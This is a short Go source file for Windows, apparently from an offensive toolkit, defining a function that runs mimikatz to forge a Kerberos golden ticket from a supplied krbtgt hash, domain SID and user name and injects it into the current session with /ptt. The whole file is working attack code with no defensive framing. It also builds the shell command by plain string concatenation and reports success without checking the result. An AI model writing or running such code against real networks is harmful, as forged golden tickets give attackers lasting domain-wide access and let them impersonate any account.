//go:build windows

package kerberos

import (
"os/exec"
)

func ForgeGoldenTicket(domain, user, krbtgtHash, sid string) bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"kerberos::golden /user:"+user+" /domain:"+domain+" /sid:"+sid+" /krbtgt:"+krbtgtHash+" /ptt\" exit")
cmd.Run()
return true
}
